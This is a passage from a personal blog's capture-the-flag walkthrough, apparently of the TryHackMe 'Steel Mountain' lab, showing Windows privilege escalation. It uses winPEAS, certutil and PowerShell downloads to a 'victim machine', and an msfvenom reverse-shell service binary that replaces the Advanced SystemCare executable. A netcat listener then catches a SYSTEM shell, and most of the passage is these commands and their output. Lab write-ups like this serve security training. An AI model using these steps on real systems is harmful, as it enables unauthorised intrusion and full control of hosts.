<span class="nt">--2025-02-26</span> 00:13:40--  https://github.com/peass-ng/PEASS-ng/releases/download/20250223-a8d560c8/winPEASany.exe
Resolving github.com <span class="o">(</span>github.com<span class="o">)</span>... 4.237.22.38
Connecting to github.com <span class="o">(</span>github.com<span class="o">)</span>|4.237.22.38|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/8d8b318f-e681-48fc-99e1-d1a6fd40641e?X-Amz-Algorithm<span class="o">=</span>AWS4-HMAC-SHA256&amp;X-Amz-Credential<span class="o">=</span>releaseassetproduction%2F20250225%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Date<span class="o">=</span>20250225T131350Z&amp;X-Amz-Expires<span class="o">=</span>300&amp;X-Amz-Signature<span class="o">=</span>c8a6c3bbe5ad5f4595100507694fd7803a4505ca1beefaf628d6e6af6d0bd549&amp;X-Amz-SignedHeaders<span class="o">=</span>host&amp;response-content-disposition<span class="o">=</span>attachment%3B%20filename%3DwinPEASany.exe&amp;response-content-type<span class="o">=</span>application%2Foctet-stream <span class="o">[</span>following]
<span class="nt">--2025-02-26</span> 00:13:41--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/8d8b318f-e681-48fc-99e1-d1a6fd40641e?X-Amz-Algorithm<span class="o">=</span>AWS4-HMAC-SHA256&amp;X-Amz-Credential<span class="o">=</span>releaseassetproduction%2F20250225%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Date<span class="o">=</span>20250225T131350Z&amp;X-Amz-Expires<span class="o">=</span>300&amp;X-Amz-Signature<span class="o">=</span>c8a6c3bbe5ad5f4595100507694fd7803a4505ca1beefaf628d6e6af6d0bd549&amp;X-Amz-SignedHeaders<span class="o">=</span>host&amp;response-content-disposition<span class="o">=</span>attachment%3B%20filename%3DwinPEASany.exe&amp;response-content-type<span class="o">=</span>application%2Foctet-stream
Resolving objects.githubusercontent.com <span class="o">(</span>objects.githubusercontent.com<span class="o">)</span>... 185.199.110.133, 185.199.109.133, 185.199.108.133, ...
Connecting to objects.githubusercontent.com <span class="o">(</span>objects.githubusercontent.com<span class="o">)</span>|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10143232 <span class="o">(</span>9.7M<span class="o">)</span> <span class="o">[</span>application/octet-stream]
Saving to: ‘winpeas.exe’

winpeas.exe                                                100%[<span class="o">========================================================================================================================================&gt;]</span>   9.67M  3.16MB/s    <span class="k">in </span>3.1s    

2025-02-26 00:13:45 <span class="o">(</span>3.16 MB/s<span class="o">)</span> - ‘winpeas.exe’ saved <span class="o">[</span>10143232/10143232]
</code></pre></div></div> <p><br> Use certutil.exe to transfer the peas to the victim machine.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;C:<span class="se">\U</span>sers<span class="se">\b</span>ill&gt;certutil.exe <span class="nt">-urlcache</span> <span class="nt">-f</span> http://10.4.119.29/winpeas.exe winpeas.exe
certutil.exe <span class="nt">-urlcache</span> <span class="nt">-f</span> http://10.4.119.29/winpeas.exe winpeas.exe
<span class="k">****</span>  Online  <span class="k">****</span>
CertUtil: <span class="nt">-URLCache</span> <span class="nb">command </span>completed successfully.
</code></pre></div></div> <p><br> Run the winpeas.exe.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\b</span>ill&gt;.<span class="se">\w</span>inpeas.exe
.<span class="se">\w</span>inpeas.exe
 <span class="o">[!]</span> If you want to run the file analysis checks <span class="o">(</span>search sensitive information <span class="k">in </span>files<span class="o">)</span>, you need to specify the <span class="s1">'fileanalysis'</span> or <span class="s1">'all'</span> argument. Note that this search might take several minutes. For <span class="nb">help</span>, run winpeass.exe <span class="nt">--help</span>
ANSI color bit <span class="k">for </span>Windows is not set. If you are executing this from a Windows terminal inside the host you should run <span class="s1">'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1'</span> and <span class="k">then </span>start a new CMD
Long paths are disabled, so the maximum length of a path supported is 260 chars <span class="o">(</span>this may cause <span class="nb">false </span>negatives when looking <span class="k">for </span>files<span class="o">)</span><span class="nb">.</span> If you are admin, you can <span class="nb">enable </span>it with <span class="s1">'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v VirtualTerminalLevel /t REG_DWORD /d 1'</span> and <span class="k">then </span>start a new CMD
     
               <span class="o">((((((((((((((((((((((((((((((((</span>                                                                                                                                                                                             
        <span class="o">(((((((((((((((((((((((((((((((((((((((((((</span>                                                                                                                                                                                         
      <span class="o">((((((((((((((</span><span class="k">**********</span>/##########<span class="o">(((((((((((((</span>                                                                                                                                                                                      
    <span class="o">((((((((((((</span><span class="k">********************</span>/#######<span class="o">(((((((((((</span>                                                                                                                                                                                     
    <span class="o">((((((((</span><span class="k">******************</span>/@@@@@/<span class="k">****</span><span class="c">######((((((((((                                                                                                                                                                                   </span>
    <span class="o">((((((</span><span class="k">********************</span>@@@@@@@@@@/<span class="k">***</span>,####<span class="o">((((((((((</span>                                                                                                                                                                                 
    <span class="o">(((((</span><span class="k">********************</span>/@@@@@%@@@@/<span class="k">********</span><span class="c">##(((((((((                                                                                                                                                                                </span>
    <span class="o">(((</span><span class="c">############*********/%@@@@@@@@@/************((((((((                                                                                                                                                                                </span>
    <span class="o">((</span><span class="c">##################(/******/@@@@@/***************((((((                                                                                                                                                                                </span>
    <span class="o">((</span><span class="c">#########################(/**********************(((((                                                                                                                                                                                </span>
    <span class="o">((</span><span class="c">##############################(/*****************(((((                                                                                                                                                                                </span>
    <span class="o">((</span><span class="c">###################################(/************(((((                                                                                                                                                                                </span>
    <span class="o">((</span><span class="c">#######################################(*********(((((                                                                                                                                                                                </span>
    <span class="o">((</span><span class="c">#######(,.***.,(###################(..***.*******(((((                                                                                                                                                                                </span>
    <span class="o">((</span><span class="c">#######*(#####((##################((######/(*****(((((                                                                                                                                                                                </span>
    <span class="o">((</span><span class="c">###################(/***********(##############()(((((                                                                                                                                                                                </span>
    <span class="o">(((</span><span class="c">#####################/*******(################)((((((                                                                                                                                                                                </span>
    <span class="o">((((</span><span class="c">############################################)((((((                                                                                                                                                                                 </span>
    <span class="o">(((((</span><span class="c">##########################################)(((((((                                                                                                                                                                                 </span>
    <span class="o">((((((</span><span class="c">########################################)(((((((                                                                                                                                                                                  </span>
    <span class="o">((((((((</span><span class="c">####################################)((((((((                                                                                                                                                                                   </span>
    <span class="o">(((((((((</span><span class="c">#################################)(((((((((                                                                                                                                                                                    </span>
        <span class="o">((((((((((</span><span class="c">##########################)(((((((((                                                                                                                                                                                      </span>
              <span class="o">((((((((((((((((((((((((((((((((((((((</span>                                                                                                                                                                                        
                 <span class="o">((((((((((((((((((((((((((((((</span> 
     
&lt;snip&gt;
</code></pre></div></div> <p><br> Look up all the services.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>LookC:<span class="se">\U</span>sers<span class="se">\b</span>ill&gt;powershell <span class="nt">-c</span> <span class="s2">"Get-Service"</span>
powershell <span class="nt">-c</span> <span class="s2">"Get-Service"</span>

Status   Name               DisplayName                           
<span class="nt">------</span>   <span class="nt">----</span>               <span class="nt">-----------</span>                           
Stopped  AdvancedSystemC... Advanced SystemCare Service 9         
Stopped  AeLookupSvc        Application Experience                
Stopped  ALG                Application Layer Gateway Service     
Running  AmazonSSMAgent     Amazon SSM Agent                      
Running  AppHostSvc         Application Host Helper Service 

&lt;snip&gt;
</code></pre></div></div> <p><br> Generate the service binary payload with msfvenom…again. Or use the last one from the meterpreter run.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ip-10-10-30-38:~/Rooms/steelmountain# msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.30.38 <span class="nv">LPORT</span><span class="o">=</span>9001 <span class="nt">-e</span> x86/shikata_ga_nai <span class="nt">-f</span> exe-service <span class="nt">-o</span> Advanced.exe
<span class="o">[</span>-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
<span class="o">[</span>-] No <span class="nb">arch </span>selected, selecting <span class="nb">arch</span>: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 <span class="o">(</span><span class="nv">iteration</span><span class="o">=</span>0<span class="o">)</span>
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of exe-service file: 15872 bytes
Saved as: Advanced.exe
root@ip-10-10-30-38:~/Rooms/steelmountain# python3 <span class="nt">-m</span> http.server
Serving HTTP on 0.0.0.0 port 8000 <span class="o">(</span>http://0.0.0.0:8000/<span class="o">)</span> ... 

&lt;snip&gt;
</code></pre></div></div> <p><br> Use PowerShell to transfer the file to the victim machine.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\b</span>ill&gt;powershell <span class="nt">-c</span> wget <span class="s2">"http://10.4.119.29:8000/Advanced.exe"</span> <span class="nt">-outfile</span> <span class="s2">"Advanced.exe"</span>
powershell <span class="nt">-c</span> wget <span class="s2">"http://10.4.119.29:8000/Advanced.exe"</span> <span class="nt">-outfile</span> <span class="s2">"Advanced.exe"</span>
</code></pre></div></div> <p><br> Create a netcat listener.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/thm/steelmountain]
└─<span class="nv">$ </span>nc <span class="nt">-nlvp</span> 9001                             
listening on <span class="o">[</span>any] 9001 ...
</code></pre></div></div> <p><br> Stop the service from running. Overwrite the binary. Start the service again.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\b</span>ill&gt;sc stop AdvancedSystemCareService9
sc stop AdvancedSystemCareService9
<span class="o">[</span>SC] ControlService FAILED 1062:

The service has not been started.


C:<span class="se">\U</span>sers<span class="se">\b</span>ill&gt;copy Advanced.exe <span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogram Files (x86)</span><span class="se">\I</span><span class="s2">Obit</span><span class="se">\A</span><span class="s2">dvanced SystemCare</span><span class="se">\A</span><span class="s2">SCService.exe"</span>
copy Advanced.exe <span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogram Files (x86)</span><span class="se">\I</span><span class="s2">Obit</span><span class="se">\A</span><span class="s2">dvanced SystemCare</span><span class="se">\A</span><span class="s2">SCService.exe"</span>
Overwrite C:<span class="se">\P</span>rogram Files <span class="o">(</span>x86<span class="o">)</span><span class="se">\I</span>Obit<span class="se">\A</span>dvanced SystemCare<span class="se">\A</span>SCService.exe? <span class="o">(</span>Yes/No/All<span class="o">)</span>: Yes
Yes
        1 file<span class="o">(</span>s<span class="o">)</span> copied.

C:<span class="se">\U</span>sers<span class="se">\b</span>ill&gt;sc start AdvancedSystemCareService9
sc start AdvancedSystemCareService9

SERVICE_NAME: AdvancedSystemCareService9 
        TYPE               : 110  WIN32_OWN_PROCESS  <span class="o">(</span>interactive<span class="o">)</span>
        STATE              : 2  START_PENDING 
                                <span class="o">(</span>NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN<span class="o">)</span>
        WIN32_EXIT_CODE    : 0  <span class="o">(</span>0x0<span class="o">)</span>
        SERVICE_EXIT_CODE  : 0  <span class="o">(</span>0x0<span class="o">)</span>
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 2044
        FLAGS              : 
</code></pre></div></div> <p><br> Check the listener and catch the shell.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/thm/steelmountain]
└─<span class="nv">$ </span>nc <span class="nt">-nlvp</span> 9001                             
listening on <span class="o">[</span>any] 9001 ...
connect to <span class="o">[</span>10.4.119.29] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.109.201] 49410
Microsoft Windows <span class="o">[</span>Version 6.3.9600]
<span class="o">(</span>c<span class="o">)</span> 2013 Microsoft Corporation. All rights reserved.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
<span class="nb">whoami
</span>nt authority<span class="se">\s</span>ystem
</code></pre></div></div> <p><br> And here we on top of the mountain. Hope you enjoyed the climb. See you in the next one.</p> </article> </div> </div> <footer class="fixed-bottom" role="contentinfo"> <div class="container mt-0"> © Copyright 2025 Biscotti Diskette. Powered by <a href="https://jekyllrb.com/" target="_blank" rel="external nofollow noopener">Jekyll</a> with <a href="https://github.com/alshedivat/al-folio" rel="external nofollow noopener" target="_blank">al-folio</a> theme. Hosted by <a href="https://pages.github.com/" target="_blank" rel="external nofollow noopener">GitHub Pages</a>. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@5.0.0/imagesloaded.pkgd.min.js" integrity="sha256-htrLFfZJ6v5udOG+3kNLINIKh2gvoKqwEhHYfTTMICc=" crossorigin="anonymous"></script> <script defer src="/assets/js/masonry.js?a0db7e5d5c70cc3252b3138b0c91dcaf" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script src="/assets/js/no_defer.js?2781658a0a2b13ed609542042a859126"></script> <script defer src="/assets/js/common.js?e0514a05c5c95ac1a93a8dfd5249b92e"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script defer src="/assets/js/jupyter_new_tab.js?d9f17b6adc2311cbabd747f4538bb15f"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js" integrity="sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI=" crossorigin="anonymous"></script> <script src="/assets/js/mathjax-setup.js?70d799092f862ad98c7876aa47712e20"></script> <script defer src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?features=es6" crossorigin="anonymous"></script> <script defer src="/assets/js/progress-bar.js?2f30e0e6801ea8f5036fa66e1ab0a71a" type="text/javascript"></script> <script src="/assets/js/vanilla-back-to-top.min.js?f40d453793ff4f64e238e420181a1d17"></script> <script>
    addBackToTop();
  </script> </body> </html>